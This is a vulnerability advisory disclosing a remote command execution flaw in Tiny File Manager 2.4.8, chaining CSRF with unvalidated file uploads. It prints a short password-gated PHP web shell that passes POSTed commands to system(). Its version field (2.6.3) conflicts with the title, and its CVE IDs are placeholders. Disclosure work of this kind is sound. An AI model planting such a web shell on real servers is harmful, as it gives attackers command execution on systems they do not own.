---
slug: advisories/mosey/
title: Tiny File Manager 2.4.8 - Remote Command Execution
authors: Carlos Bello
writer: cbello
codename: mosey
product: Tiny File Manager 2.4.8 - RCE
date: 2022-11-21 14:00 COT
cveid: CVE-2022-xxxxx,CVE-2022-xxxxx,CVE-2022-xxxxx
severity: 10.0
description: Tiny File Manager 2.4.8    -    Remote Command Execution (RCE)
keywords: Fluid Attacks, Security, Vulnerabilities, Tiny File Manager, RCE
banner: advisories-bg
advise: yes
template: advisory
---

## Summary

|                       |                                                                    |
| --------------------- | -------------------------------------------------------------------|
| **Name**              | Tiny File Manager 2.4.8 - RCE                                      |
| **Code name**         | [Mosey](https://en.wikipedia.org/wiki/Lil_Mosey)                   |
| **Product**           | Tiny File Manager                                                  |
| **Affected versions** | Version 2.6.3                                                      |
| **State**             | Public                                                             |
| **Release date**      | 2022-11-21                                                         |

## Vulnerability

|                       |                                                                                                                             |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------|
| **Kind**              | Remote command execution                                                                                                    |
| **Rule**              | [004. Remote command execution](https://docs.fluidattacks.com/criteria/vulnerabilities/004)                                 |
| **Remote**            | Yes                                                                                                                         |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H                                                                                |
| **CVSSv3 Base Score** | 10.0                                                                                                                        |
| **Exploit available** | Yes                                                                                                                         |
| **CVE ID(s)**         | [CVE-2022-xxxxx](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-xxxxx), [CVE-2022-xxxxx](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-xxxxx), [CVE-2022-xxxxx](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-xxxxx)                                                 |

## Description

Tiny File Manager version 2.4.8 allows an unauthenticated remote attacker
to execute arbitrary code remotely on the server. This is possible because
the application is vulnerable to CSRF, does not properly validate files
uploaded by users, and allows unauthenticated users to access uploaded
files.

## Vulnerability

This vulnerability occurs because the application is vulnerable to CSRF,
does not properly validate files uploaded by users and allows unauthenticated
users to access uploaded files. Thanks to this, an unauthenticated remote
attacker can execute commands on the server.

## Exploitation

To exploit this vulnerability, the following file must be sent to the server
as administrator (to achieve this I will abuse the CSRF present in the application).

### exploit.php

```php
<?php
    if($_POST && $_POST['password']==="AGSH635479302H235") {
        echo system($_POST['cmd']);
    }
?>
```

## Evidence of exploitation

![RCE-FIleManager](https://user-images.githubusercontent.com/51862990/202495758-36ca856f-19fb-4cc9-996a-d8e6000e633f.gif)

![RCE-FileManager](https://user-images.githubusercontent.com/51862990/202495810-5201db03-3c1b-4937-b252-49bbc6b62cff.png)

## Our security policy

We have reserved the CVE-2022-xxxxx, the CVE-2022-xxxxx, the CVE-2022-xxxxx to refer
to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: Tiny File Manager 2.4.8

* Operating System: GNU/Linux

## Mitigation

An updated version of Tiny File Manager is available at the vendor page.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://github.com/prasathmani/tinyfilemanager>

**Release page** <https://github.com/prasathmani/tinyfilemanager/releases/tag/2.5.0>

## Timeline

<time-lapse
  discovered="2022-11-17"
  contacted="2022-11-17"
  replied="2022-11-17"
  confirmed="2022-11-17"
  patched=""
  disclosure="2022-11-21">
</time-lapse>
